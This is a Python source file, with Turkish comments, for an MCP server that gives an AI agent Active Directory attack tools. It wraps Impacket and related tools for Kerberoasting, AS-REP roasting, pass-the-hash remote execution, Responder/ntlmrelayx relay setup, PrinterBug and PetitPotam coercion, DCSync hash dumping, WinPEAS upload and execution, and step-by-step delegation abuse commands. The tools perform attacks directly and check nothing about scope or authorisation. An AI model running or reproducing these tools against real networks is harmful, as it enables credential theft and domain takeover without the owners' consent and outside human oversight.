#!/usr/bin/env python3
"""
mcp-ad-tools: Active Directory (AD) Pentest Sunucusu
CCO için Impacket ve NetExec (CrackMapExec) tabanlı araçları JSON sarmalayıcılarla (wrappers) sunar.
"""

import os
import json
import shlex
import subprocess
import tempfile
from mcp.server.fastmcp import FastMCP

# Sunucu oluştur
mcp = FastMCP("mcp-ad-tools", dependencies=["impacket", "netexec"])

def run_command(cmd: str, timeout: int = 120) -> dict:
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "exit_code": proc.returncode,
            "cmd": cmd
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"Timeout {timeout}s", "exit_code": 124, "cmd": cmd}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "exit_code": 1, "cmd": cmd}


@mcp.tool()
def ad_smb_enum(target: str, username: str = "", password: str = "", domain: str = "") -> str:
    """SMB paylaşımlarını listeler (Null session destekler). Impacket smbclient kullanır."""
    auth = ""
    if username and password:
        auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}@"
    elif username:
        auth = f"{shlex.quote(domain)}/{shlex.quote(username)}@"
    
    cmd = f"smbclient.py {auth}{shlex.quote(target)} -c 'shares'"
    if not username and not password:
        cmd = f"smbclient.py -no-pass {shlex.quote(target)} -c 'shares'"
        
    res = run_command(cmd)
    
    summary = {"target": target, "shares": [], "error": ""}
    if res["exit_code"] == 0:
        lines = res["stdout"].splitlines()
        for line in lines:
            if line.strip() and not line.startswith("Impacket") and not line.startswith("Type"):
                summary["shares"].append(line.strip())
    else:
        summary["error"] = res["stderr"] or res["stdout"]
        
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_kerberoast(target: str, domain: str, username: str, password: str, dc_ip: str) -> str:
    """SPN sahibi hesapların biletlerini çeker (Kerberoasting). Impacket GetUserSPNs kullanır."""
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}"
    out_file = tempfile.mktemp(suffix=".txt", prefix="kerberoast_")
    
    cmd = f"GetUserSPNs.py -request -dc-ip {shlex.quote(dc_ip)} -outputfile {shlex.quote(out_file)} {auth}"
    res = run_command(cmd, timeout=300)
    
    summary = {"hashes": [], "error": "", "raw_output": res["stdout"]}
    
    if os.path.exists(out_file):
        try:
            with open(out_file, "r") as f:
                hashes = f.read().splitlines()
                summary["hashes"] = [h for h in hashes if h.startswith("$krb5tgs")]
        except Exception:
            pass
        finally:
            try:
                os.unlink(out_file)
            except:
                pass
                
    if not summary["hashes"] and res["exit_code"] != 0:
        summary["error"] = res["stderr"] or res["stdout"]

    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_asreproast(target: str, domain: str, users_file: str = "", dc_ip: str = "") -> str:
    """Pre-Auth istemeyen hesapları bulup TGT çeker (AS-REPRoasting). Impacket GetNPUsers kullanır."""
    auth = f"{shlex.quote(domain)}/"
    out_file = tempfile.mktemp(suffix=".txt", prefix="asrep_")
    
    cmd = f"GetNPUsers.py -no-pass -dc-ip {shlex.quote(dc_ip)} "
    if users_file:
        cmd += f"-usersfile {shlex.quote(users_file)} "
    
    cmd += f"-format hashcat -outputfile {shlex.quote(out_file)} {auth}"
    
    res = run_command(cmd, timeout=300)
    summary = {"hashes": [], "error": "", "raw_output": res["stdout"]}
    
    if os.path.exists(out_file):
        try:
            with open(out_file, "r") as f:
                hashes = f.read().splitlines()
                summary["hashes"] = [h for h in hashes if h.startswith("$krb5asrep")]
        except Exception:
            pass
        finally:
            try:
                os.unlink(out_file)
            except:
                pass

    if not summary["hashes"] and res["exit_code"] != 0:
        summary["error"] = res["stderr"] or res["stdout"]

    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_exec(target: str, command: str, domain: str = "", username: str = "", password: str = "", hashes: str = "", method: str = "wmiexec") -> str:
    """Hedef Windows makinede komut çalıştırır (Lateral Movement).
    Args:
        method: 'wmiexec', 'smbexec', 'psexec'
        hashes: NTLM hash (Pass-The-Hash için LM:NT formatında)
    """
    if method not in ["wmiexec", "smbexec", "psexec"]:
        return json.dumps({"error": "Desteklenmeyen metod. Sadece wmiexec, smbexec, psexec."}, ensure_ascii=False)
        
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"
    else:
        auth += " -no-pass"
        
    # Tek seferlik komut çalıştır (interaktif olmayan)
    cmd = f"{method}.py {auth}@{shlex.quote(target)} {shlex.quote(command)}"
    
    res = run_command(cmd, timeout=60)
    
    summary = {
        "target": target,
        "method": method,
        "command": command,
        "stdout": res["stdout"][-2000:], # Sadece son 2000 karakter (Context Compression)
        "stderr": res["stderr"][-2000:],
        "exit_code": res["exit_code"]
    }
    
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_ntlm_relay_setup(
    targets_file: str,
    interface: str = "eth0",
    loot_dir: str = "",
    socks: bool = True
) -> str:
    """Responder + ntlmrelayx NTLM relay saldırısı kurar.
    SMB signing devre dışı hedeflere relay eder. Önce smb2-security-mode taraması yapın.

    Args:
        targets_file: Relay hedeflerinin dosyası (IP listesi, signing=false olanlar)
        interface: Ağ arayüzü (varsayılan: eth0)
        loot_dir: SAM/NTDS dump dosyalarının kaydedileceği dizin
        socks: SOCKS proxy üzerinden oturum aç (varsayılan: True)
    """
    loot = loot_dir or os.path.join(os.environ.get("CCO_HOME", os.path.expanduser("~/.cco")), "loot", "ntlm_relay")
    os.makedirs(loot, exist_ok=True)

    # ntlmrelayx komutu oluştur
    relay_args = f"-tf {shlex.quote(targets_file)} -smb2support"
    if socks:
        relay_args += " -socks"
    relay_args += f" -l {shlex.quote(loot)}"

    setup_commands = {
        "step1_smb_signing_check": f"nmap --script smb2-security-mode -p 445 -iL {shlex.quote(targets_file)} -oN {loot}/smb_signing.txt",
        "step2_responder": f"responder -I {shlex.quote(interface)} -rdw --disable-ess -v > {loot}/responder.log 2>&1 &",
        "step3_ntlmrelayx": f"ntlmrelayx.py {relay_args} > {loot}/relay.log 2>&1 &",
        "loot_dir": loot,
        "note": "Responder ve ntlmrelayx background'da başlatıldı. Trigger için: ad_printerbug veya ad_petitpotam kullanın.",
        "socks_usage": "proxychains wmiexec.py -no-pass DOMAIN/user@TARGET (socks=True ise)"
    }

    # SMB signing kontrolü çalıştır (sync)
    signing_check = run_command(setup_commands["step1_smb_signing_check"], timeout=120)

    result = {
        "setup_commands": setup_commands,
        "smb_signing_scan": signing_check["stdout"][-1000:],
        "responder_cmd": setup_commands["step2_responder"],
        "ntlmrelayx_cmd": setup_commands["step3_ntlmrelayx"],
        "loot_dir": loot
    }

    return json.dumps(result, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_printerbug(
    listener_ip: str,
    target_dc: str,
    domain: str = "",
    username: str = "",
    password: str = ""
) -> str:
    """MS-RPRN PrinterBug (SpoolSample) — hedef DC'yi dinleyici IP'ye geri bağlantı yapmaya zorlar.
    NTLM relay veya unconstrained delegation ile birlikte kullanılır.

    Args:
        listener_ip: Geri bağlantıyı alacak IP (Responder/ntlmrelayx dinliyor olmalı)
        target_dc: Hedef Domain Controller IP/hostname
        domain: Domain adı (opsiyonel)
        username: Kimlik doğrulama kullanıcısı
        password: Parola
    """
    # printerbug.py (impacket-extras)
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}@" if username else ""
    cmd = f"printerbug.py {auth}{shlex.quote(target_dc)} {shlex.quote(listener_ip)}"

    # Alternatif: dementor.py (farklı coercion methodu)
    alt_cmd = f"python3 /opt/dementor.py -u {shlex.quote(username)} -p {shlex.quote(password)} -d {shlex.quote(domain)} {shlex.quote(listener_ip)} {shlex.quote(target_dc)}" if username else ""

    res = run_command(cmd, timeout=30)

    return json.dumps({
        "command": cmd,
        "stdout": res["stdout"],
        "stderr": res["stderr"],
        "exit_code": res["exit_code"],
        "alternative_cmd": alt_cmd,
        "note": "Başarılı olursa DC'nin makine hesabı hash'i dinleyiciye gelir. ntlmrelayx ile relay edin."
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_petitpotam(
    listener_ip: str,
    target: str,
    domain: str = "",
    username: str = "",
    password: str = ""
) -> str:
    """PetitPotam (LSARPC EFS coercion) — hedef makineyi dinleyici IP'ye kimlik doğrulama yapmaya zorlar.
    PrinterBug'ın çalışmadığı modern sistemlerde kullanın (MS-RPRN yamalanmış olabilir).

    Args:
        listener_ip: Geri bağlantıyı alacak IP
        target: Hedef makine IP/hostname (DC veya başka sunucu)
        domain: Domain adı
        username: Kimlik doğrulama kullanıcısı (anonymous da çalışabilir)
        password: Parola
    """
    # PetitPotam.py (topotam/PetitPotam)
    auth_args = ""
    if username:
        auth_args = f"-u {shlex.quote(username)} -p {shlex.quote(password)} -d {shlex.quote(domain)}"

    cmd = f"python3 /opt/PetitPotam/PetitPotam.py {auth_args} {shlex.quote(listener_ip)} {shlex.quote(target)}"

    res = run_command(cmd, timeout=30)

    return json.dumps({
        "command": cmd,
        "stdout": res["stdout"],
        "stderr": res["stderr"],
        "exit_code": res["exit_code"],
        "install_hint": "Kurulu değilse: git clone https://github.com/topotam/PetitPotam /opt/PetitPotam",
        "note": "Domain admin gerekmiyor. LSARPC (RPC üzerinden EFS) zorlaması yapar."
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_dcsync(
    dc_ip: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    target_user: str = "krbtgt"
) -> str:
    """DCSync saldırısı — impacket secretsdump ile domain hash'lerini çeker.
    DS-Replication-Get-Changes-All izni gerektirir (Domain Admin veya delegasyon).

    Args:
        dc_ip: Domain Controller IP
        domain: Domain adı (örn: corp.local)
        username: Domain Admin kullanıcısı
        password: Parola (hashes yoksa)
        hashes: NTLM hash (LM:NT formatında, PTH için)
        target_user: Hedef kullanıcı ('krbtgt', 'Administrator' veya 'all' tüm domain)
    """
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"

    loot_dir = os.path.join(os.environ.get("CCO_HOME", os.path.expanduser("~/.cco")), "loot", "dcsync")
    os.makedirs(loot_dir, exist_ok=True)
    out_file = os.path.join(loot_dir, f"dcsync_{dc_ip.replace('.','_')}.txt")

    if target_user == "all":
        cmd = f"secretsdump.py {auth}@{shlex.quote(dc_ip)} -just-dc-ntlm -outputfile {shlex.quote(out_file)}"
    else:
        cmd = f"secretsdump.py {auth}@{shlex.quote(dc_ip)} -just-dc-user {shlex.quote(target_user)}"

    res = run_command(cmd, timeout=300)

    # Hash'leri parse et
    hashes_found = []
    for line in res["stdout"].splitlines():
        if ":::" in line and not line.startswith("["):
            hashes_found.append(line.strip())

    return json.dumps({
        "command": cmd.replace(password or "PASS", "***") if password else cmd,
        "hashes_found": hashes_found[:50],  # İlk 50
        "total_hashes": len(hashes_found),
        "output_file": out_file if target_user == "all" else None,
        "raw_output": res["stdout"][-2000:],
        "error": res["stderr"][-500:] if res["exit_code"] != 0 else ""
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_winpeas_run(
    target_ip: str,
    username: str,
    password: str = "",
    hashes: str = "",
    domain: str = ".",
    method: str = "wmiexec"
) -> str:
    """WinPEAS'ı hedefe aktar ve çalıştır, çıktıyı parse et.
    Privilege escalation vektörlerini otomatik listeler.

    Args:
        target_ip: Hedef Windows IP
        username: Kullanıcı adı
        password: Parola
        hashes: NTLM hash (PTH için)
        domain: Domain adı (local için '.')
        method: Çalıştırma yöntemi ('wmiexec' veya 'smbexec')
    """
    cco_home = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))
    winpeas_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
    winpeas_local = os.path.join(cco_home, "tools", "winPEASx64.exe")

    os.makedirs(os.path.dirname(winpeas_local), exist_ok=True)

    # WinPEAS indir (yoksa)
    if not os.path.exists(winpeas_local):
        dl_res = run_command(f"wget -q -O {shlex.quote(winpeas_local)} {winpeas_url}", timeout=120)
        if dl_res["exit_code"] != 0:
            return json.dumps({"error": f"WinPEAS indirilemedi: {dl_res['stderr'][:300]}"})

    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"

    # SMB üzerinden yükle
    upload_cmd = f"smbclient.py {auth}@{shlex.quote(target_ip)} -c 'put {winpeas_local} winpeas.exe'"
    run_command(upload_cmd, timeout=60)

    # Çalıştır ve çıktıyı al
    exec_cmd = f"{method}.py {auth}@{shlex.quote(target_ip)} 'cmd /c C:\\\\winpeas.exe quiet'"
    res = run_command(exec_cmd, timeout=300)

    # Kritik bulguları parse et
    findings = []
    critical_patterns = [
        "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege",
        "AlwaysInstallElevated", "Unquoted Service", "Modifiable Service",
        "No quotes and Space", "Stored credential", "Autologon credentials",
        "Interesting files", "Windows Credentials", "PowerShell History",
        "DPAPI Master Keys"
    ]

    for line in res["stdout"].splitlines():
        for pattern in critical_patterns:
            if pattern.lower() in line.lower():
                findings.append(line.strip()[:200])
                break

    return json.dumps({
        "target": target_ip,
        "critical_findings": findings,
        "total_findings": len(findings),
        "raw_output_tail": res["stdout"][-3000:],
        "exit_code": res["exit_code"]
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_token_impersonate(
    target_ip: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = ""
) -> str:
    """Token impersonation için mevcut oturum token'larını listeler.
    SeImpersonatePrivilege olan hesaplarda incognito/Rubeus alternatifi.

    Args:
        target_ip: Hedef Windows IP
        domain: Domain adı
        username: Kullanıcı adı
        password: Parola
        hashes: NTLM hash
    """
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"

    # Çalışan process ve sahiplerini listele
    list_cmd = f"wmiexec.py {auth}@{shlex.quote(target_ip)} 'cmd /c whoami /priv'"
    privs_res = run_command(list_cmd, timeout=60)

    sessions_cmd = f"wmiexec.py {auth}@{shlex.quote(target_ip)} 'cmd /c query session'"
    sessions_res = run_command(sessions_cmd, timeout=60)

    # SeImpersonatePrivilege kontrolü
    has_impersonate = "SeImpersonatePrivilege" in privs_res["stdout"]
    has_assign_primary = "SeAssignPrimaryTokenPrivilege" in privs_res["stdout"]

    recommendations = []
    if has_impersonate or has_assign_primary:
        recommendations.append("PrintSpoofer64.exe -i -c cmd  (Windows 10/Server 2019+)")
        recommendations.append("JuicyPotatoNG.exe -t * -p cmd  (Windows Server 2016-)")
        recommendations.append("RoguePotato (Network service context)")

    return json.dumps({
        "target": target_ip,
        "privileges": privs_res["stdout"][-1500:],
        "active_sessions": sessions_res["stdout"][-1000:],
        "has_seimpersonate": has_impersonate,
        "has_seassignprimary": has_assign_primary,
        "potato_attack_applicable": has_impersonate or has_assign_primary,
        "recommended_exploits": recommendations
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_unconstrained_delegation(
    domain: str,
    dc_ip: str,
    username: str,
    password: str = "",
    hashes: str = ""
) -> str:
    """Unconstrained delegation'lı bilgisayarları ve kullanıcıları bulur.
    Bu makinelere erişimle DC'nin TGT'si alınabilir (PrinterBug + Rubeus monitor).

    Args:
        domain: Domain adı
        dc_ip: Domain Controller IP
        username: Domain kullanıcısı
        password: Parola
        hashes: NTLM hash
    """
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"

    # LDAP base DN hesapla (f-string dışında — Python 3.11 uyumlu)
    dc_base = ",DC=".join(domain.split("."))
    bind_dn = domain + "\\" + username
    ldap_pw = password or "pass"

    ldap_cmd = (
        "ldapsearch -x -H ldap://" + shlex.quote(dc_ip) +
        " -D '" + bind_dn + "' -w " + shlex.quote(ldap_pw) +
        " -b 'DC=" + dc_base + "'"
        " '(userAccountControl:1.2.840.113556.1.4.803:=524288)'"
        " sAMAccountName dNSHostName"
    )

    # PowerShell ile (wmiexec üzerinden domain controller'da)
    ps_filter = "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name,DNSHostName"
    ps_cmd = (
        "wmiexec.py " + auth + "@" + shlex.quote(dc_ip) +
        " 'powershell -c \"" + ps_filter + "\"'"
    )

    res = run_command(ps_cmd, timeout=60)
    ldap_res = run_command(ldap_cmd, timeout=30)

    return json.dumps({
        "domain": domain,
        "unconstrained_machines_ps": res["stdout"][-1500:],
        "unconstrained_machines_ldap": ldap_res["stdout"][-1500:],
        "next_steps": [
            "1. Bu makinede kod çalıştırabiliyorsan: Rubeus.exe monitor /interval:5 /nowrap",
            "2. ad_printerbug ile DC'yi bu makineye yönlendir",
            "3. Gelen TGT'yi: Rubeus.exe ptt /ticket:BASE64_TICKET",
            "4. DCSync: ad_dcsync ile tüm domain hash'lerini al"
        ]
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def ad_constrained_delegation(
    domain: str,
    dc_ip: str,
    username: str,
    password: str = "",
    hashes: str = ""
) -> str:
    """Constrained delegation konfigürasyonu olan hesapları ve servis bağlantılarını bulur.
    S4U2Self + S4U2Proxy ile istenen hesap adına bilet alınabilir.

    Args:
        domain: Domain adı
        dc_ip: Domain Controller IP
        username: Domain kullanıcısı
        password: Parola
        hashes: NTLM hash
    """
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    if password:
        auth += f":{shlex.quote(password)}"
    elif hashes:
        auth += f" -hashes {shlex.quote(hashes)}"

    # LDAP base DN hesapla (Python 3.11 uyumlu — f-string dışında)
    dc_base = ",DC=".join(domain.split("."))
    bind_dn = domain + "\\" + username
    ldap_pw = password or ""

    ldap_cmd = (
        "ldapsearch -x -H ldap://" + shlex.quote(dc_ip) +
        " -D '" + bind_dn + "' -w " + shlex.quote(ldap_pw) +
        " -b 'DC=" + dc_base + "'"
        " '(msDS-AllowedToDelegateTo=*)'"
        " sAMAccountName msDS-AllowedToDelegateTo"
    )

    ps_filter = "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne ''} -Properties msDS-AllowedToDelegateTo | Select Name,msDS-AllowedToDelegateTo"
    ps_cmd = (
        "wmiexec.py " + auth + "@" + shlex.quote(dc_ip) +
        " 'powershell -c \"" + ps_filter + "\"'"
    )

    res = run_command(ps_cmd, timeout=60)
    ldap_res = run_command(ldap_cmd, timeout=30)

    return json.dumps({
        "domain": domain,
        "constrained_delegation_ps": res["stdout"][-1500:],
        "constrained_delegation_ldap": ldap_res["stdout"][-1500:],
        "exploitation_guide": {
            "rubeus_s4u": "Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/TARGET /nowrap",
            "impacket": "getST.py -spn cifs/TARGET -impersonate administrator DOMAIN/SVC_ACCOUNT:PASS",
            "use_ticket": "export KRB5CCNAME=administrator.ccache && psexec.py -k -no-pass DOMAIN/administrator@TARGET"
        }
    }, indent=2, ensure_ascii=False)


if __name__ == "__main__":
    mcp.run()
